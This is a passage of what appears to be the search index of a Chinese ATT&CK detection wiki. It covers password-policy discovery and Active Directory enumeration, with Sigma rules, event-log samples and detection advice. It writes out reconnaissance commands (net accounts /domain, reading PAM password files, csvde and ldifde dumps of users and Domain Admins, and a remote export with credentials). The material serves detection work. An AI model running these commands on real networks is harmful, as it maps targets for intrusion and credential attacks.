\u4e0e\u5408\u6cd5\u8fdc\u7a0b\u7cfb\u7edf\u53d1\u73b0\u76f8\u5173\u7684\u6b63\u5e38\u3001\u826f\u6027\u7cfb\u7edf\u548c\u7f51\u7edc\u4e8b\u4ef6\u53ef\u80fd\u4e0d\u5e38\u89c1\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u73af\u5883\u548c\u4f7f\u7528\u65b9\u5f0f\u3002\u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4ee5\u4e86\u89e3\u4e3a\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u800c\u53ef\u80fd\u91c7\u53d6\u7684\u64cd\u4f5c\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u5982Windows management Instrumentation\u548cPowerShell\uff09\u83b7\u53d6\u4fe1\u606f\u3002 \u5728\u57fa\u4e8e\u4e91\u7684\u7cfb\u7edf\u4e2d\uff0c\u672c\u673a\u65e5\u5fd7\u8bb0\u5f55\u53ef\u7528\u4e8e\u6807\u8bc6\u5bf9\u67d0\u4e9b\u53ef\u80fd\u5305\u542b\u7cfb\u7edf\u4fe1\u606f\u7684api\u548c\u4eea\u8868\u677f\u7684\u8bbf\u95ee\u3002\u6839\u636e\u73af\u5883\u7684\u4f7f\u7528\u65b9\u5f0f\uff0c\u7531\u4e8e\u6b63\u5e38\u64cd\u4f5c\u671f\u95f4\u7684\u826f\u6027\u4f7f\u7528\uff0c\u4ec5\u6b64\u6570\u636e\u53ef\u80fd\u4e0d\u591f\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1135</p> <p>https://attack.mitre.org/techniques/T1135/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/","title":"T1201-win-\u5bc6\u7801\u7b56\u7565\u53d1\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u7528\u4e8e\u7f51\u7edc\u7684\u5bc6\u7801\u7b56\u7565\u662f\u4e00\u79cd\u5f3a\u5236\u6267\u884c\u590d\u6742\u5bc6\u7801\u7684\u65b9\u6cd5\uff0c\u8fd9\u4e9b\u5bc6\u7801\u5f88\u96be\u901a\u8fc7\u66b4\u529b\u731c\u6d4b\u6216\u7834\u89e3\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5c1d\u8bd5\u8bbf\u95ee\u6709\u5173\u4f01\u4e1a\u7f51\u7edc\u4e2d\u4f7f\u7528\u7684\u5bc6\u7801\u7b56\u7565\u7684\u8be6\u7ec6\u4fe1\u606f\u3002\u8fd9\u5c06\u6709\u52a9\u4e8e\u653b\u51fb\u8005\u521b\u5efa\u4e00\u4e2a\u901a\u7528\u5bc6\u7801\u5217\u8868\uff0c\u5e76\u542f\u52a8\u7b26\u5408\u7b56\u7565\u7684\u5b57\u5178\u548c/\u6216\u66b4\u529b\u653b\u51fb\uff08\u4f8b\u5982\uff0c\u5982\u679c\u6700\u5c0f\u5bc6\u7801\u957f\u5ea6\u5e94\u4e3a8\uff0c\u5219\u4e0d\u5c1d\u8bd5\u201cpass123\u201d\u7b49\u5bc6\u7801\uff1b\u5982\u679c\u9501\u5b9a\u8bbe\u7f6e\u4e3a6\uff0c\u5219\u4e0d\u68c0\u67e5\u6bcf\u4e2a\u5e10\u6237\u8d85\u8fc73-4\u4e2a\u5bc6\u7801\uff0c\u4ee5\u514d\u9501\u5b9a\u5e10\u6237\uff09\u3002 \u5bc6\u7801\u7b56\u7565\u53ef\u4ee5\u5728Windows\u3001Linux\u548cmacOS\u7cfb\u7edf\u4e0a\u8bbe\u7f6e\u548c\u67e5\u627e\u3002</p> <p>Windows</p> <ul> <li>net accounts</li> <li>net accounts /domain</li> </ul> <p>Linux</p> <ul> <li>chage -l</li> <li>cat /etc/pam.d/common-password</li> </ul> <p>macOS</p> <ul> <li>pwpolicy getaccountpolicies</li> </ul>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>windows\u4e0b\u6267\u884cnet accounts\u4ee5\u53canet accounts /domain</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows  \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>Microsoft Windows [\u7248\u672c 10.0.14393]\n(c) 2016 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\n\nC:\\Users\\administrator.0DAY&gt;net accounts\n\u5f3a\u5236\u7528\u6237\u5728\u65f6\u95f4\u5230\u671f\u4e4b\u540e\u591a\u4e45\u5fc5\u987b\u6ce8\u9500?:     \u4ece\u4e0d\n\u5bc6\u7801\u6700\u77ed\u4f7f\u7528\u671f\u9650(\u5929):                    1\n\u5bc6\u7801\u6700\u957f\u4f7f\u7528\u671f\u9650(\u5929):                    42\n\u5bc6\u7801\u957f\u5ea6\u6700\u5c0f\u503c:                          7\n\u4fdd\u6301\u7684\u5bc6\u7801\u5386\u53f2\u8bb0\u5f55\u957f\u5ea6:                  24\n\u9501\u5b9a\u9608\u503c:                                \u4ece\u4e0d\n\u9501\u5b9a\u6301\u7eed\u65f6\u95f4(\u5206):                        30\n\u9501\u5b9a\u89c2\u6d4b\u7a97\u53e3(\u5206):                        30\n\u8ba1\u7b97\u673a\u89d2\u8272:                              SERVER\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows\u5b89\u5168\u65e5\u5fd7\u3001\u8fdb\u7a0b\u3001\u547d\u4ee4\u884c\u53c2\u6570\uff08windows server 2016\uff09</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: windows \u7cfb\u7edf\u5bc6\u7801\u7b56\u7565\u53d1\u73b0\ndescription: windows server 2016\nreferences:\ntags: T1016\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        Newprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\Windows\\System32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: net  accounts #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\n    selection2:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        Newprocessname: 'C:\\Windows\\System32\\net1.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: C:\\Windows\\system32\\net1  accounts #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\n    condition: selection1 and selection2\nlevel: low\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#_6","title":"\u5efa\u8bae","text":"<p>\u9488\u5bf9\u57df\u5185\u5bc6\u7801\u7b56\u7565\u679a\u4e3e\u547d\u4ee4net accounts /domain\u7684\u68c0\u6d4b\u53ef\u4ece\u4ee5\u4e0b\u4e8b\u4ef6ID \uff08\u57df\u63a7\u4e3b\u673a\uff09\u5165\u624b\u68c0\u6d4b\uff1a4672\u7279\u6b8a\u767b\u5f55\u30014624\u767b\u5f55\u30015140\u6587\u4ef6\u5171\u4eab\u30015145\u8be6\u7ec6\u6587\u4ef6\u5171\u4eab\u30014661SAM\u6587\u4ef6\u30014658\u5176\u4ed6\u5bf9\u8c61\u8bbf\u95ee\u4e8b\u4ef6\u3002\u5f53\u7136\u4e5f\u53ef\u4ee5\u9488\u5bf9\u57df\u5185\u4e3b\u673a\u6267\u884cnet accounts /domain\u547d\u4ee4\u8fdb\u884c\u68c0\u6d4b\uff0c\u5229\u7528\u57df\u63a7\u4e3b\u673a\u8bb0\u5f55\u7684\u767b\u9646IP\u8fdb\u884c\u5173\u8054\u3002</p> <p>\u76d1\u89c6\u53ef\u80fd\u6b63\u5728\u7528\u4e8e\u5bc6\u7801\u7b56\u7565\u53d1\u73b0\u7684\u5de5\u5177\u548c\u547d\u4ee4\u884c\u53c2\u6570\u7684\u8fdb\u7a0b\u3002\u5c06\u8be5\u6d3b\u52a8\u4e0e\u6e90\u7cfb\u7edf\u4e2d\u7684\u5176\u4ed6\u53ef\u7591\u6d3b\u52a8\u5173\u8054\u8d77\u6765\uff0c\u4ee5\u51cf\u5c11\u6765\u81ea\u6709\u6548\u7528\u6237\u6216\u7ba1\u7406\u5458\u6d3b\u52a8\u7684\u6f5c\u5728\u8bef\u62a5\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u64cd\u4f5c\u7684\u65e9\u671f\u5c1d\u8bd5\u67e5\u627e\u5bc6\u7801\u7b56\u7565\uff0c\u5e76\u4e14\u8be5\u6d3b\u52a8\u53ef\u80fd\u4e0e\u5176\u4ed6\u53d1\u73b0\u6d3b\u52a8\u4e00\u8d77\u53d1\u751f\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1201</p> <p>https://attack.mitre.org/techniques/T1201/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/","title":"T1482-win-\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u83b7\u53d6\u68c0\u6d4b","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u6536\u96c6\u6709\u5173\u57df\u4fe1\u4efb\u5173\u7cfb\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u7528\u4e8e\u8bc6\u522bWindows\u591a\u57df\u6216\u8005\u6797\u73af\u5883\u4e2d\u7684\u6a2a\u5411\u79fb\u52a8\u7684\u673a\u4f1a\u3002\u57df\u4fe1\u4efb\u4e3a\u57df\u63d0\u4f9b\u4e86\u4e00\u79cd\u673a\u5236\uff0c\u4ee5\u5141\u8bb8\u57fa\u4e8e\u53e6\u4e00\u4e2a\u57df\u7684\u8eab\u4efd\u9a8c\u8bc1\u8fc7\u7a0b\u8bbf\u95ee\u8d44\u6e90\u3002\u57df\u4fe1\u4efb\u5141\u8bb8\u53d7\u4fe1\u4efb\u57df\u7684\u7528\u6237\u8bbf\u95ee\u4fe1\u4efb\u57df\u4e2d\u7684\u8d44\u6e90\u3002\u53d1\u73b0\u7684\u4fe1\u606f\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u8fdb\u884cSID\u5386\u53f2\u8bb0\u5f55\u6ce8\u5165\u3001\u7968\u636e\u4f20\u9012\u548cKerberoasting\u3002\u53ef\u4ee5\u4f7f\u7528DSEnumerateDomainTrusts()Win32 API\u8c03\u7528\uff0c.NET\u65b9\u6cd5\u548cLDAP\u679a\u4e3e\u57df\u4fe1\u4efb\u3002\u5df2\u77e5Windows\u5b9e\u7528\u7a0b\u5e8fNltest\u88ab\u653b\u51fb\u8005\u7528\u6765\u679a\u4e3e\u57df\u4fe1\u4efb\u4fe1\u606f\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u5728\u672c\u6587\u4e2d\u5c06\u4ecb\u7ecd\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> <ul> <li>\u4f7f\u7528csvde\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f</li> <li>\u4f7f\u7528ldifde\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f</li> <li>\u4f7f\u7528AdFind\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f</li> <li>\u4f7f\u7528nltest\u83b7\u53d6\u57df\u5185\u4fe1\u606f\u5173\u7cfb</li> </ul>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>Windows\u5b89\u5168\u65e5\u5fd7\u3001sysmon\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#0x01-csvde","title":"0x01 \u4f7f\u7528csvde\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f","text":"<p>\u8bf4\u660e\u6587\u6863\uff1a</p> <p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732101(v=ws.11)</p> <p>\u4f7f\u7528csvde\u5bfc\u51fa\u7684\u6587\u4ef6\u683c\u5f0f\u4e3acsv\uff0c\u53ef\u4ee5\u4f7f\u7528Microsoft Excel\u67e5\u770b</p> <p>\u9ed8\u8ba4\u53ea\u80fd\u5728\u4ee5\u4e0b\u7cfb\u7edf\u4f7f\u7528\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>Windows Server 2003</li> <li>Windows Server 2008</li> <li>Windows Server 2003 R2</li> <li>Windows Server 2008 R2</li> <li>Windows Server 2012,</li> <li>Windows Server 2003 with SP1</li> <li>Windows 8</li> <li>~</li> </ul>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_4","title":"\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b","text":"<pre><code>\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a\ncsvde -f all.csv\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7528\u6237\u4fe1\u606f\uff1a\ncsvde -f user.csv -r \"(&amp;(objectCategory=person))\"\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u4fe1\u606f\uff1a\ncsvde -f machine.csv -r \"(&amp;(objectCategory=computer))\"\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ec4\u4fe1\u606f\uff1a\ncsvde -f group.csv -r \"(&amp;(objectCategory=group))\"\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ba1\u7406\u5458\u7ec4\u7684\u7528\u6237\u4fe1\u606f\uff1a\ncsvde -f admin.csv -r \"(&amp;(objectCategory=group)(name=Domain Admins))\"\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709OU\u4fe1\u606f\uff1a\ncsvde -f ou.csv -r \"(&amp;(objectCategory=organizationalUnit))\"\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u57df\u7528\u6237\u540d\uff1a\ncsvde -f username.csv -r \"(&amp;(objectCategory=person))\" -l SamAccountName\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u8ba1\u7b97\u673a\u540d\uff1a\ncsvde -f machinename.csv -r \"(&amp;(objectCategory=computer))\" -l name\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_5","title":"\u6a21\u62df\u6d4b\u8bd5\u6548\u679c","text":"<pre><code>#\u57df\u63a7\u5236\u5668\u6a21\u62df\u6d4b\u8bd5\u6548\u679cwindows server 2016\nC:\\Users\\12306br0&gt;csvde -f all.csv\n\u8fde\u63a5\u5230\u201c(null)\u201d\n\u7528 SSPI \u4f5c\u4e3a\u5f53\u524d\u7528\u6237\u767b\u5f55\n\u5c06\u76ee\u5f55\u5bfc\u51fa\u5230\u6587\u4ef6 all.csv\n\u641c\u7d22\u9879\u76ee...\n\u5199\u51fa\u9879\u76ee\n...............................................................................................................................................................................................................................\n\u5bfc\u51fa\u5b8c\u6bd5\u3002\u540e\u7eed\u5904\u7406\u6b63\u5728\u8fdb\u884c...\n\u5bfc\u51fa\u4e86 223 \u4e2a\u9879\u76ee\n\n\u547d\u4ee4\u5df2\u6210\u529f\u5b8c\u6210\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_6","title":"\u6d4b\u8bd5\u7559\u75d5\u6548\u679c","text":"<pre><code>#windows\u5b89\u5168\u65e5\u5fd74688\u8fdb\u7a0b\u521b\u5efa\n\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002\n\n\u521b\u5efa\u8005\u4e3b\u9898:\n \u5b89\u5168 ID:  361A\\12306br0\n \u5e10\u6237\u540d:  12306br0\n \u5e10\u6237\u57df:  361A\n \u767b\u5f55 ID:  0x36D7FD\n\n\u76ee\u6807\u4e3b\u9898:\n \u5b89\u5168 ID:  NULL SID\n \u5e10\u6237\u540d:  -\n \u5e10\u6237\u57df:  -\n \u767b\u5f55 ID:  0x0\n\n\u8fdb\u7a0b\u4fe1\u606f:\n \u65b0\u8fdb\u7a0b ID:  0x12c0\n \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\csvde.exe\n \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938\n \u5f3a\u5236\u6027\u6807\u7b7e:  Mandatory Label\\Medium Mandatory Level\n \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x1234\n \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe\n \u8fdb\u7a0b\u547d\u4ee4\u884c: csvde  -f all.csv\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_7","title":"\u5efa\u8bae","text":"<p>\u5907\u6ce8\uff1a\u901a\u8fc7Windows\u5b89\u5168\u65e5\u5fd7\u53ef\u4ee5\u770b\u5230\uff0c\u5728\u8fdb\u7a0bcsvde\u521b\u5efa\u4e4b\u540e\uff1b\u4f1a\u8fdb\u884c\u7aef\u53e3\u7ed1\u5b9a\u6d3b\u52a8\u751f\u6210\u4e8b\u4ef65158\uff1b\u63a5\u7740\u8fdb\u884c\u7b5b\u9009\u8fde\u63a5\u884c\u4e3a\u751f\u6210\u4e8b\u4ef65156\uff0c\u7aef\u53e3389\uff1b\u6700\u540e\u5173\u95ed\u8fdb\u7a0b\u4e8b\u4ef64689.</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_8","title":"\u4ece\u57df\u5916\u8fdc\u7a0b\u5bfc\u51fa\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b","text":"<pre><code>\u5bfc\u51fa\u8fdc\u7a0b\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a\ncsvde -s 192.168.1.1 -a test\\admin Password -f all.csv\n</code></pre> <p>\u6682\u65e0\u6a21\u62df\u6d4b\u8bd5\u4ee5\u53ca\u6d4b\u8bd5\u7559\u75d5\u6570\u636e\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#0x02-ldifde","title":"0x02 \u4f7f\u7528ldifde\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f","text":"<p>\u8bf4\u660e\u6587\u6863\uff1a</p> <p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731033(v=ws.11)</p> <p>\u4f7f\u7528ldifde\u5bfc\u51fa\u7684\u6587\u4ef6\u683c\u5f0f\u4e3aLDIF\uff0c\u53ef\u4ee5\u4f7f\u7528notepad.exe\u67e5\u770b</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_9","title":"\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b","text":"<pre><code>\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a\nldifde -f all.txt\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7528\u6237\u4fe1\u606f\uff1a\nldifde -r \"(&amp;(objectCategory=person))\" -f user.txt\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u4fe1\u606f\uff1a\nldifde -r \"(&amp;(objectCategory=computer))\" -f machine.txt\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ec4\u4fe1\u606f\uff1a\nldifde -r \"(&amp;(objectCategory=group))\" -f group.txt\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ba1\u7406\u5458\u7ec4\u7684\u7528\u6237\u4fe1\u606f\uff1a\nldifde -r \"(&amp;(objectCategory=group)(name=Domain Admins))\" -f admin.txt\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709OU\u4fe1\u606f\uff1a\nldifde -r \"(&amp;(objectCategory=organizationalUnit))\" -f ou.txt\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u57df\u7528\u6237\u540d\uff1a\nldifde -r \"(&amp;(objectCategory=person))\" -l SamAccountName -f username.txt\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u8ba1\u7b97\u673a\u540d\uff1a\nldifde -r \"(&amp;(objectCategory=computer))\" -l name -f machinename.txt\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_10","title":"\u6a21\u62df\u6d4b\u8bd5\u6548\u679c","text":"<pre><code>C:\\Users\\12306br0\\Desktop\\AdFind&gt;ldifde -f all.txt\n\u8fde\u63a5\u5230\u201c12306BR0B4DD.361a.com\u201d\n\u7528 SSPI \u4f5c\u4e3a\u5f53\u524d\u7528\u6237\u767b\u5f55\n\u5c06\u76ee\u5f55\u5bfc\u51fa\u5230\u6587\u4ef6 all.txt\n\u641c\u7d22\u9879\u76ee...\n\u5199\u51fa\u9879\u76ee...............................................................................................................................................................................................................................\n\u5bfc\u51fa\u4e86 223 \u4e2a\u9879\u76ee\n\n\u547d\u4ee4\u5df2\u6210\u529f\u5b8c\u6210\n\nC:\\Users\\12306br0\\Desktop\\AdFind&gt;\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_11","title":"\u6d4b\u8bd5\u7559\u75d5\u6548\u679c","text":"<pre><code>\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002\n\n\u521b\u5efa\u8005\u4e3b\u9898:\n \u5b89\u5168 ID:  361A\\12306br0\n \u5e10\u6237\u540d:  12306br0\n \u5e10\u6237\u57df:  361A\n \u767b\u5f55 ID:  0x36D7FD\n\n\u76ee\u6807\u4e3b\u9898:\n \u5b89\u5168 ID:  NULL SID\n \u5e10\u6237\u540d:  -\n \u5e10\u6237\u57df:  -\n \u767b\u5f55 ID:  0x0\n\n\u8fdb\u7a0b\u4fe1\u606f:\n \u65b0\u8fdb\u7a0b ID:  0xdd8\n \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\ldifde.exe\n \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938\n \u5f3a\u5236\u6027\u6807\u7b7e:  Mandatory Label\\Medium Mandatory Level\n \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x69c\n \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe\n \u8fdb\u7a0b\u547d\u4ee4\u884c: ldifde  -f all.txt\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_12","title":"\u5efa\u8bae","text":"<p>\u5907\u6ce8\uff1a\u57fa\u4e8eWindows\u5b89\u5168\u65e5\u5fd7\u68c0\u6d4b\u8be5\u5f02\u5e38\u884c\u4e3a\uff0c\u91cd\u70b9\u53ef\u5173\u6ce8Windows\u5b89\u5168\u65e5\u5fd7\u4e2d\u76844688\u30015158\u30015156\u30014689\u4e8b\u4ef6\uff0c\u5176\u4e2d\u8fdb\u7a0b\u4fe1\u606f\u3001\u76ee\u6807\u7aef\u53e3\uff0853\u3001389\uff09\u53ef\u4f5c\u4e3a\u91cd\u70b9\u5173\u6ce8\u5bf9\u8c61\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1